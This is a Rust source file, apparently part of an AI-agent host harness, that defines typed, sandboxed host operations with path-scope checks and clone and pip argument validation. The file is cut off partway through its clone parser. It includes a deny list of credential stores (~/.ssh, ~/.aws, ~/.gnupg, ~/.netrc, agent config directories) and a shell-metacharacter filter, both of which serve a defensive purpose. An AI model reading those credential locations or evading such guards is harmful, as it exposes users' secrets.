//! Typed host operations: the only things the host runs on its own
//! behalf.
//!
//! Before an executor starts, the host lists directories, reads files,
//! asks Git about repositories, clones a repository the task names, and
//! installs packages the task names. Each of those is an [`Operation`]
//! with typed arguments, never a command string. No task-derived text
//! reaches a shell: an operation runs natively (list, read) or as one
//! program with an argument vector (Git, Python, pip), and every path
//! argument is checked against a [`Scope`] first.
//!
//! Each operation declares its [`Effects`]: `observe` operations read and
//! change nothing, `write` operations create files inside the writable
//! scope, and `install` operations change the Python environment. Git runs
//! with optional locks off, so even `git status` leaves the index alone.
//! Jev's relevance answer never validates an argument; [`Scope::check`]
//! does.

use std::collections::BTreeSet;
use std::path::{Component, Path, PathBuf};
use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

/// What an operation may change.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EffectClass {
    /// Reads only. Changes no file, index, or environment.
    Observe,
    /// Creates or changes files inside the writable scope.
    Write,
    /// Changes the Python environment.
    Install,
}

impl EffectClass {
    /// The class as the record spells it.
    #[must_use]
    pub fn word(self) -> &'static str {
        match self {
            EffectClass::Observe => "observe",
            EffectClass::Write => "write",
            EffectClass::Install => "install",
        }
    }
}

/// An operation's declared effects.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Effects {
    pub class: EffectClass,
    /// Whether it reaches the network.
    pub network: bool,
    /// What it writes: paths, or `python-environment`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub writes: Vec<String>,
}

/// Which entries a listing keeps.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ListFilter {
    /// Every entry.
    #[default]
    All,
    /// Test files and test directories only.
    Tests,
}

/// A read-only Git question.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "query", rename_all = "snake_case")]
pub enum GitQuery {
    Status,
    Branches,
    Log { count: u32 },
    Reflog { count: u32 },
    Stashes,
}

/// A read-only question about the installed tools.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "query", rename_all = "snake_case")]
pub enum ToolQuery {
    /// `python3 --version`.
    Python,
    /// The installed Python packages, at most `max_lines` lines.
    PipList { max_lines: usize },
}

/// A pip option the host passes through. Anything else is refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PipFlag {
    NoBuildIsolation,
    NoDeps,
    Upgrade,
    Quiet,
}

impl PipFlag {
    fn arg(self) -> &'static str {
        match self {
            PipFlag::NoBuildIsolation => "--no-build-isolation",
            PipFlag::NoDeps => "--no-deps",
            PipFlag::Upgrade => "--upgrade",
            PipFlag::Quiet => "--quiet",
        }
    }
}

/// One host operation, with typed arguments.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum Operation {
    /// The entries under a directory, to a depth, skipping `.git` and
    /// dependency trees.
    List {
        path: String,
        depth: usize,
        max_entries: usize,
        #[serde(default)]
        filter: ListFilter,
    },
    /// The head of one file.
    Read {
        path: String,
        max_lines: usize,
        max_bytes: usize,
    },
    /// A read-only Git question about one repository.
    Git { repo: String, query: GitQuery },
    /// A read-only question about the installed tools.
    Tool { query: ToolQuery },
    /// Whether a program is on `PATH` and, when it is, the version it
    /// prints (`evidence.environment`). Only a program
    /// [`crate::environment::known`] names is probed.
    Presence { program: String },
    /// A shallow clone of a public HTTPS repository into the writable
    /// scope.
    Clone {
        url: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        branch: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        depth: Option<u32>,
        dest: String,
    },
    /// A pip install of named packages, an editable path, or a
    /// requirements file.
    Install {
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        packages: Vec<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        editable: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        requirements: Option<String>,
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        flags: Vec<PipFlag>,
    },
}

/// Options that keep Git from writing while it reads: no optional locks,
/// and no index refresh from `git diff`, which `diff.autoRefreshIndex`
/// would otherwise write back.
pub const READ_ONLY_GIT: &[&str] = &[
    "--no-optional-locks",
    "-c",
    "diff.autoRefreshIndex=false",
    "-c",
    "gc.auto=0",
];

/// The operation runner's identity and bounds, digested.
#[must_use]
pub fn implementation() -> crate::record::Implementation {
    crate::record::Implementation::new(
        "host.operation",
        "typed operations v1",
        &json!({
            "read_only_git": READ_ONLY_GIT,
            "skip_dirs": SKIP_DIRS,
            "max_git_count": MAX_GIT_COUNT,
            "max_read_bytes": MAX_READ_BYTES,
            "max_list_entries": MAX_LIST_ENTRIES,
            "stream_bytes": 16 * 1024,
            "observe_deadline_sec": 10,
            "setup_deadline_sec": 240,
        }),
    )
}

/// Directories a listing never descends into.
const SKIP_DIRS: &[&str] = &[".git", "node_modules", "__pycache__"];
/// The most lines a Git log or reflog asks for.
const MAX_GIT_COUNT: u32 = 200;
/// The most bytes one read takes.
const MAX_READ_BYTES: usize = 256 * 1024;
/// The most entries one listing takes.
const MAX_LIST_ENTRIES: usize = 2_000;

impl Operation {
    /// The operation's declared effects, before it runs.
    #[must_use]
    pub fn effects(&self) -> Effects {
        match self {
            Operation::List { .. }
            | Operation::Read { .. }
            | Operation::Git { .. }
            | Operation::Tool { .. }
            | Operation::Presence { .. } => Effects {
                class: EffectClass::Observe,
                network: false,
                writes: Vec::new(),
            },
            Operation::Clone { dest, .. } => Effects {
                class: EffectClass::Write,
                network: true,
                writes: vec![dest.clone()],
            },
            Operation::Install { .. } => Effects {
                class: EffectClass::Install,
                network: true,
                writes: vec!["python-environment".to_string()],
            },
        }
    }

    /// A short label for people and for the briefing.
    #[must_use]
    pub fn label(&self) -> String {
        match self {
            Operation::List {
                path,
                depth,
                filter,
                ..
            } => match filter {
                ListFilter::All if *depth <= 1 => format!("list {path}"),
                ListFilter::All => format!("list {path} (depth {depth})"),
                ListFilter::Tests => format!("list test files under {path} (depth {depth})"),
            },
            Operation::Read {
                path, max_lines, ..
            } => format!("read {path} (first {max_lines} lines)"),
            Operation::Git { repo, query } => {
                let what = match query {
                    GitQuery::Status => "status".to_string(),
                    GitQuery::Branches => "branch -a -vv".to_string(),
                    GitQuery::Log { count } => format!("log --oneline --graph --all -n {count}"),
                    GitQuery::Reflog { count } => format!("reflog -n {count}"),
                    GitQuery::Stashes => "stash list".to_string(),
                };
                if repo == "." {
                    format!("git {what}")
                } else {
                    format!("git -C {repo} {what}")
                }
            }
            Operation::Tool { query } => match query {
                ToolQuery::Python => "python3 --version".to_string(),
                ToolQuery::PipList { .. } => "pip list".to_string(),
            },
            Operation::Presence { program } => format!("presence of {program}"),
            Operation::Clone {
                url, branch, dest, ..
            } => match branch {
                Some(branch) => format!("clone {url} at {branch} into {dest}"),
                None => format!("clone {url} into {dest}"),
            },
            Operation::Install {
                packages,
                editable,
                requirements,
                ..
            } => {
                let mut what: Vec<String> = packages.clone();
                if let Some(path) = editable {
                    what.push(format!("-e {path}"));
                }
                if let Some(path) = requirements {
                    what.push(format!("-r {path}"));
                }
                format!("pip install {}", what.join(" "))
            }
        }
    }
}

/// Why an operation was refused before it ran.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Refusal {
    /// The argument at fault.
    pub argument: String,
    pub reason: String,
}

impl Refusal {
    fn new(argument: &str, reason: impl Into<String>) -> Self {
        Self {
            argument: argument.chars().take(200).collect(),
            reason: reason.into(),
        }
    }
}

impl std::fmt::Display for Refusal {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}: {}", self.argument, self.reason)
    }
}

/// Where operations may read and write.
///
/// Reads may reach the working directory and any root added with
/// [`Scope::allow_read`]; writes only the working directory and roots
/// added with [`Scope::allow_write`]. Credential stores and kernel
/// filesystems are denied even inside a root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Scope {
    pub workdir: PathBuf,
    pub read: Vec<PathBuf>,
    pub write: Vec<PathBuf>,
    pub deny: Vec<PathBuf>,
}

impl Scope {
    /// Reads and writes inside `workdir` only.
    #[must_use]
    pub fn new(workdir: &Path) -> Self {
        let workdir = real(workdir);
        let mut deny: Vec<PathBuf> = ["/proc", "/sys", "/dev"]
            .iter()
            .map(PathBuf::from)
            .collect();
        if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
            for dir in [
                ".ssh",
                ".gnupg",
                ".aws",
                ".codex",
                ".claude",
                ".openagents",
                ".config/gh",
                ".netrc",
            ] {
                deny.push(real(&home.join(dir)));
            }
        }
        Self {
            read: vec![workdir.clone()],
            write: vec![workdir.clone()],
            workdir,
            deny,
        }
    }

    /// Lets reads reach `root` too.
    pub fn allow_read(&mut self, root: &Path) {
        let root = real(root);
        if !self.read.contains(&root) {
            self.read.push(root);
        }
    }

    /// Lets writes reach `root` too.
    pub fn allow_write(&mut self, root: &Path) {
        let root = real(root);
        if !self.write.contains(&root) {
            self.write.push(root);
        }
    }

    /// Resolves a path argument for reading.
    ///
    /// # Errors
    ///
    /// Refuses text that is not a plain path, a path that leaves every
    /// read root (through `..` or a symbolic link), or a denied path.
    pub fn readable(&self, argument: &str) -> Result<PathBuf, Refusal> {
        let path = self.resolve(argument)?;
        self.inside(argument, &path, &self.read, "read")?;
        Ok(path)
    }

    /// Resolves a path argument for writing. The path need not exist.
    ///
    /// # Errors
    ///
    /// As [`Scope::readable`], against the write roots.
    pub fn writable(&self, argument: &str) -> Result<PathBuf, Refusal> {
        let path = self.resolve(argument)?;
        self.inside(argument, &path, &self.write, "write")?;
        Ok(path)
    }

    fn inside(
        &self,
        argument: &str,
        path: &Path,
        roots: &[PathBuf],
        what: &str,
    ) -> Result<(), Refusal> {
        if self.deny.iter().any(|denied| path.starts_with(denied)) {
            return Err(Refusal::new(argument, "a denied location"));
        }
        if !roots.iter().any(|root| path.starts_with(root)) {
            return Err(Refusal::new(
                argument,
                format!("outside the {what} scope ({})", self.roots(roots)),
            ));
        }
        Ok(())
    }

    fn roots(&self, roots: &[PathBuf]) -> String {
        roots
            .iter()
            .map(|root| root.to_string_lossy().into_owned())
            .collect::<Vec<_>>()
            .join(", ")
    }

    /// The argument as a real absolute path: lexically normalized, then
    /// with its longest existing prefix resolved through symbolic links.
    fn resolve(&self, argument: &str) -> Result<PathBuf, Refusal> {
        plain(argument)?;
        let joined = if Path::new(argument).is_absolute() {
            PathBuf::from(argument)
        } else {
            self.workdir.join(argument)
        };
        let mut normal = PathBuf::new();
        for part in joined.components() {
            match part {
                Component::RootDir | Component::Prefix(_) => normal.push(part),
                Component::CurDir => {}
                Component::ParentDir => {
                    if !normal.pop() || normal.as_os_str().is_empty() {
                        return Err(Refusal::new(argument, "climbs above the root"));
                    }
                }
                Component::Normal(name) => normal.push(name),
            }
        }
        // Resolve the longest prefix that exists, so a link inside a root
        // that points out of it is caught.
        let mut existing = normal.clone();
        let mut rest = Vec::new();
        while !existing.exists() {
            match (existing.file_name(), existing.parent()) {
                (Some(name), Some(parent)) => {
                    rest.push(name.to_os_string());
                    existing = parent.to_path_buf();
                }
                _ => break,
            }
        }
        let mut real = existing.canonicalize().unwrap_or(existing);
        for name in rest.into_iter().rev() {
            real.push(name);
        }
        Ok(real)
    }
}

/// A path's real form when it exists, and the path itself when not.
fn real(path: &Path) -> PathBuf {
    path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
}

/// Refuses argument text that is not a plain value: empty, overlong, an
/// option, or holding a control character.
fn plain(argument: &str) -> Result<(), Refusal> {
    if argument.is_empty() {
        return Err(Refusal::new(argument, "empty"));
    }
    if argument.len() > 1_024 {
        return Err(Refusal::new(argument, "longer than 1,024 bytes"));
    }
    if argument.starts_with('-') {
        return Err(Refusal::new(argument, "reads as an option"));
    }
    if argument.chars().any(char::is_control) {
        return Err(Refusal::new(argument, "holds a control character"));
    }
    Ok(())
}

/// An operation the scope accepted: what runs, with resolved arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Checked {
    List {
        root: PathBuf,
        shown: String,
        depth: usize,
        max_entries: usize,
        filter: ListFilter,
    },
    Read {
        path: PathBuf,
        max_lines: usize,
        max_bytes: usize,
    },
    /// One program with its argument vector, run in `cwd`.
    Program {
        argv: Vec<String>,
        cwd: PathBuf,
        max_lines: Option<usize>,
        wall: Duration,
    },
    /// A program looked up on `PATH`, then run with `args` when found and
    /// `args` isn't empty.
    Presence {
        program: String,
        args: Vec<String>,
        cwd: PathBuf,
        wall: Duration,
    },
}

impl Scope {
    /// Validates every argument of `operation` and resolves it.
    ///
    /// # Errors
    ///
    /// The first argument the scope or the value rules refuse.
    pub fn check(&self, operation: &Operation) -> Result<Checked, Refusal> {
        match operation {
            Operation::List {
                path,
                depth,
                max_entries,
                filter,
            } => {
                let root = self.readable(path)?;
                if !root.is_dir() {
                    return Err(Refusal::new(path, "not a directory"));
                }
                if *depth == 0 || *depth > 8 {
                    return Err(Refusal::new(&depth.to_string(), "depth must be 1 to 8"));
                }
                Ok(Checked::List {
                    root,
                    shown: path.clone(),
                    depth: *depth,
                    max_entries: (*max_entries).clamp(1, MAX_LIST_ENTRIES),
                    filter: *filter,
                })
            }
            Operation::Read {
                path,
                max_lines,
                max_bytes,
            } => {
                let file = self.readable(path)?;
                if !file.is_file() {
                    return Err(Refusal::new(path, "not a regular file"));
                }
                Ok(Checked::Read {
                    path: file,
                    max_lines: (*max_lines).max(1),
                    max_bytes: (*max_bytes).clamp(1, MAX_READ_BYTES),
                })
            }
            Operation::Git { repo, query } => {
                let dir = self.readable(repo)?;
                if !dir.is_dir() {
                    return Err(Refusal::new(repo, "not a directory"));
                }
                let mut argv: Vec<String> = std::iter::once("git")
                    .chain(READ_ONLY_GIT.iter().copied())
                    .chain(["-C"])
                    .map(ToString::to_string)
                    .collect();
                argv.push(dir.to_string_lossy().into_owned());
                let count = |count: u32| -> Result<String, Refusal> {
                    if count == 0 || count > MAX_GIT_COUNT {
                        return Err(Refusal::new(
                            &count.to_string(),
                            format!("count must be 1 to {MAX_GIT_COUNT}"),
                        ));
                    }
                    Ok(count.to_string())
                };
                let rest: Vec<String> = match query {
                    GitQuery::Status => vec!["status".into()],
                    GitQuery::Branches => vec!["branch".into(), "-a".into(), "-vv".into()],
                    GitQuery::Log { count: n } => vec![
                        "log".into(),
                        "--oneline".into(),
                        "--graph".into(),
                        "--all".into(),
                        "-n".into(),
                        count(*n)?,
                    ],
                    GitQuery::Reflog { count: n } => {
                        vec!["reflog".into(), "-n".into(), count(*n)?]
                    }
                    GitQuery::Stashes => vec!["stash".into(), "list".into()],
                };
                argv.extend(rest);
                Ok(Checked::Program {
                    argv,
                    cwd: self.workdir.clone(),
                    max_lines: None,
                    wall: Duration::from_secs(10),
                })
            }
            Operation::Tool { query } => {
                let (argv, max_lines): (Vec<&str>, Option<usize>) = match query {
                    ToolQuery::Python => (vec!["python3", "--version"], None),
                    ToolQuery::PipList { max_lines } => (
                        vec![
                            "python3",
                            "-m",
                            "pip",
                            "list",
                            "--disable-pip-version-check",
                        ],
                        Some(*max_lines),
                    ),
                };
                Ok(Checked::Program {
                    argv: argv.into_iter().map(ToString::to_string).collect(),
                    cwd: self.workdir.clone(),
                    max_lines,
                    wall: Duration::from_secs(10),
                })
            }
            Operation::Presence { program } => {
                if !crate::environment::known(program) {
                    return Err(Refusal::new(
                        program,
                        "not a program the presence probe asks about",
                    ));
                }
                Ok(Checked::Presence {
                    program: program.clone(),
                    args: crate::environment::version_args(program),
                    cwd: self.workdir.clone(),
                    wall: Duration::from_secs(crate::environment::VERSION_SEC),
                })
            }
            Operation::Clone {
                url,
                branch,
                depth,
                dest,
            } => {
                https_url(url)?;
                let target = self.writable(dest)?;
                if target.exists() {
                    return Err(Refusal::new(dest, "already exists"));
                }
                let mut argv: Vec<String> = vec!["git".into(), "clone".into()];
                if let Some(depth) = depth {
                    if *depth == 0 || *depth > 1_000 {
                        return Err(Refusal::new(&depth.to_string(), "depth must be 1 to 1000"));
                    }
                    argv.extend(["--depth".into(), depth.to_string()]);
                }
                if let Some(branch) = branch {
                    reference(branch)?;
                    argv.extend(["--branch".into(), branch.clone()]);
                }
                argv.extend([
                    "--".into(),
                    url.clone(),
                    target.to_string_lossy().into_owned(),
                ]);
                Ok(Checked::Program {
                    argv,
                    cwd: self.workdir.clone(),
                    max_lines: None,
                    wall: Duration::from_secs(240),
                })
            }
            Operation::Install {
                packages,
                editable,
                requirements,
                flags,
            } => {
                if packages.is_empty() && editable.is_none() && requirements.is_none() {
                    return Err(Refusal::new("pip install", "names nothing to install"));
                }
                let mut argv: Vec<String> = ["python3", "-m", "pip", "install"]
                    .iter()
                    .map(ToString::to_string)
                    .collect();
                argv.push("--disable-pip-version-check".into());
                for flag in flags {
                    argv.push(flag.arg().to_string());
                }
                if let Some(path) = editable {
                    let dir = self.readable(path)?;
                    argv.extend(["--editable".into(), dir.to_string_lossy().into_owned()]);
                }
                if let Some(path) = requirements {
                    let file = self.readable(path)?;
                    argv.extend(["--requirement".into(), file.to_string_lossy().into_owned()]);
                }
                for package in packages {
                    requirement(package)?;
                    argv.push(package.clone());
                }
                Ok(Checked::Program {
                    argv,
                    cwd: self.workdir.clone(),
                    max_lines: None,
                    wall: Duration::from_secs(240),
                })
            }
        }
    }
}

/// Accepts a public HTTPS URL of plain characters.
fn https_url(url: &str) -> Result<(), Refusal> {
    plain(url)?;
    let Some(rest) = url.strip_prefix("https://") else {
        return Err(Refusal::new(url, "only https:// URLs are cloned"));
    };
    let host = rest.split('/').next().unwrap_or_default();
    if host.is_empty() || host.contains('@') {
        return Err(Refusal::new(url, "needs a host and no credentials"));
    }
    if !url
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || "-._~:/%+".contains(c))
    {
        return Err(Refusal::new(url, "holds a character a URL here may not"));
    }
    Ok(())
}

/// Accepts a branch or tag name Git itself would accept, conservatively.
fn reference(name: &str) -> Result<(), Refusal> {
    plain(name)?;
    let ok = name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || "-._/".contains(c))
        && !name.contains("..");
    if ok {
        Ok(())
    } else {
        Err(Refusal::new(name, "not a plain branch or tag name"))
    }
}

/// Accepts a pip requirement such as `numpy`, `cython==3.0.11`, or
/// `pkg[extra]>=1,<2`.
fn requirement(spec: &str) -> Result<(), Refusal> {
    plain(spec)?;
    let starts = spec
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphanumeric());
    let ok = spec
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || "-._[],=<>!~+".contains(c));
    if starts && ok {
        Ok(())
    } else {
        Err(Refusal::new(spec, "not a plain package requirement"))
    }
}

/// What one operation produced.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Capture {
    /// The operation's id within its plan.
    pub id: String,
    pub label: String,
    pub operation: Operation,
    pub effects: Effects,
    /// The program and arguments that ran; `None` for a native operation
    /// or a refused one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub argv: Option<Vec<String>>,
    /// The exit code; `Some(0)` for a native operation that succeeded.
    pub exit: Option<i32>,
    /// What it printed, held to its bounds.
    pub output: String,
    /// How many bytes it produced before the bounds.
    pub bytes: u64,
    pub truncated: bool,
    /// SHA-256 of `output`, hex.
    pub sha256: String,
    pub milliseconds: u64,
    /// Why the operation did not run, when it did not.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub refused: Option<Refusal>,
}

impl Capture {
    /// Whether the operation ran and exited zero.
    #[must_use]
    pub fn succeeded(&self) -> bool {
        self.refused.is_none() && self.exit == Some(0)
    }

    /// The capture as the trajectory records it, without the output.
    #[must_use]
    pub fn record(&self) -> Value {
        json!({
            "id": self.id,
            "label": self.label,
            "operation": self.operation,
            "effects": self.effects,
            "argv": self.argv,
            "exit": self.exit,
            "bytes": self.bytes,
            "chars": self.output.chars().count(),
            "truncated": self.truncated,
            "sha256": self.sha256,
            "milliseconds": self.milliseconds,
            "refused": self.refused,
        })
    }
}

/// Runs one operation under `scope`. A refused operation returns a capture
/// with `refused` set and nothing run.
pub async fn run(id: &str, operation: &Operation, scope: &Scope) -> Capture {
    run_within(id, operation, scope, None).await
}

/// Runs one operation under `scope`, a program held to the smaller of its
/// own bound and `limit`, such as what an episode deadline grants.
pub async fn run_within(
    id: &str,
    operation: &Operation,
    scope: &Scope,
    limit: Option<Duration>,
) -> Capture {
    let started = Instant::now();
    let mut capture = Capture {
        id: id.to_string(),
        label: operation.label(),
        operation: operation.clone(),
        effects: operation.effects(),
        argv: None,
        exit: None,
        output: String::new(),
        bytes: 0,
        truncated: false,
        sha256: String::new(),
        milliseconds: 0,
        refused: None,
    };
    match scope.check(operation) {
        Err(refusal) => capture.refused = Some(refusal),
        Ok(Checked::List {
            root,
            shown,
            depth,
            max_entries,
            filter,
        }) => {
            let (text, total, cut) = list(&root, &shown, depth, max_entries, filter);
            capture.exit = Some(0);
            capture.bytes = total;
            capture.truncated = cut;
            capture.output = text;
        }
        Ok(Checked::Read {
            path,
            max_lines,
            max_bytes,
        }) => match head(&path, max_lines, max_bytes) {
            Ok((text, total, cut)) => {
                capture.exit = Some(0);
                capture.bytes = total;
                capture.truncated = cut;
                capture.output = text;
            }
            Err(error) => {
                capture.exit = Some(1);
                capture.output = error;
            }
        },
        Ok(Checked::Program {
            argv,
            cwd,
            max_lines,
            wall,
        }) => {
            let wall = limit.map_or(wall, |limit| wall.min(limit));
            run_program(&mut capture, argv, &cwd, max_lines, wall).await;
        }
        Ok(Checked::Presence {
            program,
            args,
            cwd,
            wall,
        }) => match crate::environment::find(&program) {
            None => {
                capture.exit = Some(127);
                capture.output = crate::environment::absent_output(&program);
            }
            Some(found) if args.is_empty() => {
                capture.argv = Some(vec![found.to_string_lossy().into_owned()]);
                capture.exit = Some(0);
                capture.output = found.to_string_lossy().into_owned();
            }
            Some(found) => {
                let wall = limit.map_or(wall, |limit| wall.min(limit));
                let argv = std::iter::once(found.to_string_lossy().into_owned())
                    .chain(args)
                    .collect();
                run_program(&mut capture, argv, &cwd, Some(3), wall).await;
            }
        },
    }
    capture.sha256 = hex(&Sha256::digest(capture.output.as_bytes()));
    capture.milliseconds = u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX);
    capture
}

/// Runs `argv` in `cwd` under `wall`, holding its output to `max_lines`,
/// and fills in `capture`.
async fn run_program(
    capture: &mut Capture,
    argv: Vec<String>,
    cwd: &Path,
    max_lines: Option<usize>,
    wall: Duration,
) {
    let mut command = std::process::Command::new(&argv[0]);
    command.args(&argv[1..]).current_dir(cwd);
    quiet_environment(&mut command);
    let ended = supervise::Job::from_command(command)
        .bounded(supervise::Limits::within(wall).keeping(16 * 1024))
        .run()
        .await;
    let mut output = ended.stdout.marked();
    if !ended.stderr.is_empty() {
        if !output.is_empty() {
            output.push('\n');
        }
        output.push_str(&ended.stderr.marked());
    }
    if let supervise::Ending::TimedOut = ended.ending {
        output.push_str(&format!("\n[ended: the {}s bound passed]", wall.as_secs()));
    }
    if let supervise::Ending::Failed(why) = &ended.ending {
        output.push_str(&format!("[could not run: {why}]"));
    }
    let mut truncated = ended.truncated();
    if let Some(max) = max_lines {
        let lines = output.lines().count();
        if lines > max {
            output = output.lines().take(max).collect::<Vec<_>>().join("\n");
            output.push_str(&format!("\n…{} more lines", lines - max));
            truncated = true;
        }
    }
    capture.argv = Some(argv);
    capture.exit = ended.ending.code();
    capture.bytes = ended.bytes();
    capture.truncated = truncated;
    capture.output = output.trim_end().to_string();
}

/// Runs operations concurrently, in their order, each program held to
/// `limit` when one is given.
pub async fn run_all(
    operations: &[(String, Operation)],
    scope: &Scope,
    limit: Option<Duration>,
) -> Vec<Capture> {
    futures_util::future::join_all(
        operations
            .iter()
            .map(|(id, operation)| run_within(id, operation, scope, limit)),
    )
    .await
}

/// Strips credentials from a child's environment and keeps Git and Python
/// from writing anything they would only write opportunistically.
pub(crate) fn quiet_environment(command: &mut std::process::Command) {
    for (name, _) in std::env::vars_os() {
        if name.to_str().is_some_and(crate::shell::is_credential) {
            command.env_remove(&name);
        }
    }
    command
        .env("GIT_OPTIONAL_LOCKS", "0")
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_PAGER", "cat")
        .env("PAGER", "cat")
        .env("PYTHONDONTWRITEBYTECODE", "1")
        .stdin(std::process::Stdio::null());
}

/// A bounded listing: one line per entry, `path/` for a directory and
/// `path  N B` for a file, sorted, depth first. Returns the text, the
/// number of entries seen, and whether the bound cut it.
fn list(
    root: &Path,
    shown: &str,
    depth: usize,
    max_entries: usize,
    filter: ListFilter,
) -> (String, u64, bool) {
    let mut lines = Vec::new();
    let mut seen: u64 = 0;
    let mut pending = vec![(root.to_path_buf(), String::new(), 1usize)];
    // Walk directories in sorted order, depth first, as `find` would.
    while let Some((dir, prefix, level)) = pending.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut entries: Vec<_> = entries.flatten().collect();
        entries.sort_by_key(std::fs::DirEntry::file_name);
        let mut subdirs = Vec::new();
        for entry in entries {
            let name = entry.file_name().to_string_lossy().into_owned();
            let Ok(kind) = entry.file_type() else {
                continue;
            };
            let relative = format!("{prefix}{name}");
            let is_dir = kind.is_dir();
            let line = if kind.is_symlink() {
                let target = std::fs::read_link(entry.path())
                    .map(|t| t.to_string_lossy().into_owned())
                    .unwrap_or_default();
                format!("{relative} -> {target}")
            } else if is_dir {
                format!("{relative}/")
            } else {
                let size = entry.metadata().map_or(0, |m| m.len());
                format!("{relative}  {size} B")
            };
            let keep = match filter {
                ListFilter::All => true,
                ListFilter::Tests => is_test_name(&name, is_dir),
            };
            if keep {
                seen += 1;
                if lines.len() < max_entries {
                    lines.push(line);
                }
            }
            if is_dir && !SKIP_DIRS.contains(&name.as_str()) && level < depth {
                subdirs.push((entry.path(), format!("{relative}/"), level + 1));
            }
        }
        pending.extend(subdirs.into_iter().rev());
    }
    let cut = seen > lines.len() as u64;
    let mut text = if lines.is_empty() {
        format!("{shown}: no entries")
    } else {
        format!("{shown}:\n{}", lines.join("\n"))
    };
    if cut {
        text.push_str(&format!("\n…{} more entries", seen - lines.len() as u64));
    }
    (text, seen, cut)
}

fn is_test_name(name: &str, is_dir: bool) -> bool {
    if is_dir {
        return name == "tests" || name == "test";
    }
    (name.starts_with("test_") && name.ends_with(".py"))
        || name.ends_with("_test.py")
        || name.contains(".test.")
}

/// The head of a file: at most `max_lines` lines and `max_bytes` bytes.
/// Returns the text, the file's size, and whether the bounds cut it.
fn head(path: &Path, max_lines: usize, max_bytes: usize) -> Result<(String, u64, bool), String> {
    use std::io::Read as _;
    let file = std::fs::File::open(path).map_err(|error| error.to_string())?;
    let size = file.metadata().map_or(0, |m| m.len());
    let mut bytes = Vec::new();
    file.take(max_bytes as u64)
        .read_to_end(&mut bytes)
        .map_err(|error| error.to_string())?;
    if bytes.iter().take(8_192).any(|&b| b == 0) {
        return Ok((format!("[binary file, {size} bytes]"), size, false));
    }
    let text = String::from_utf8_lossy(&bytes);
    let lines: Vec<&str> = text.lines().collect();
    let mut cut = size > bytes.len() as u64;
    let mut kept = lines.clone();
    if lines.len() > max_lines {
        kept.truncate(max_lines);
        cut = true;
    }
    let mut out = kept.join("\n");
    if cut {
        out.push_str(&format!(
            "\n…[first {} lines of a {size}-byte file]",
            kept.len()
        ));
    }
    Ok((out, size, cut))
}

/// Setup operations parsed from command text the instruction names, or
/// why a command could not become one.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Proposed {
    /// The command as the instruction wrote it.
    pub source: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub operation: Option<Operation>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub refused: Option<String>,
}

/// Parses a `git clone` or `pip install` command into a typed operation.
/// `workdir` names where an unnamed clone lands. A command that uses shell
/// syntax or an option the host does not pass through is refused, not
/// approximated.
#[must_use]
pub fn parse_setup(command: &str, workdir: &Path) -> Proposed {
    let refuse = |why: &str| Proposed {
        source: command.to_string(),
        operation: None,
        refused: Some(why.to_string()),
    };
    if command
        .chars()
        .any(|c| "|&;<>$`\\\"'(){}*?".contains(c) || c.is_control())
    {
        return refuse("uses shell syntax");
    }
    let words: Vec<&str> = command.split_whitespace().collect();
    let parsed = match words.as_slice() {
        ["git", "clone", rest @ ..] => parse_clone(rest, workdir),
        ["pip" | "pip3", "install", rest @ ..]
        | ["python3" | "python", "-m", "pip", "install", rest @ ..] => parse_pip(rest),
        _ => Err("is not a git clone or a pip install".to_string()),
    };
    match parsed {
        Ok(operation) => Proposed {
            source: command.to_string(),
            operation: Some(operation),
            refused: None,
        },
        Err(why) => refuse(&why),
    }
}

fn parse_clone(words: &[&str], workdir: &Path) -> Result<Operation, String> {
    let mut branch = None;
    let mut depth = None;
    let mut positional = Vec::new();
    let mut i = 0;
    while i < words.len() {
        match words[i] {
            "--depth" => {
                let value = words.get(i + 1).ok_or("--depth needs a value")?;
                depth = Some(
                    value
                        .parse::<u32>()
                        .map_err(|_| "--depth is not a number")?,
                );
                i += 1;
            }
            "--branch" | "-b" => {
                branch = Some((*words.get(i + 1).ok_or("--branch needs a value")?).to_string());
                i += 1;
            }
            "--single-branch" => {}
            other if other.starts_with("--depth=") => {
                depth = Some(
                    other["--depth=".len()..]
                        .parse::<u32>()
                        .map_err(|_| "--depth is not a number")?,
                );
            }
            other if other.starts_with("--branch=") => {
